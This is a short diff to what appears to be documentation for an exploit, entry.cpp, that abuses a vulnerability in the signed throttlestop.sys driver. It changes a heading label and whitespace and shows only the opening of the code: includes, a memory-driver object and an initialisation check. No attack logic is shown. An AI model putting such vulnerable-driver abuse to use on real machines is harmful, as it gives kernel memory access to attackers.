@@ -2,7 +2,7 @@ The exploit (entry.cpp) uses the vulnerability in throttlestop.sys signed driver
 
 
 
-entry.cpp:-
+entry.cpp (source code) :-
 #include "driver/driver.h"
 #include "superfetch/superfetch.h"
 #include <iostream>
@@ -12,7 +12,7 @@ entry.cpp:-
 int main()
 {
     MemoryDriver Driver;
-
+    
     if (!Driver.Initialize())
     {
         std::wcout << L"failed to init driver\n";
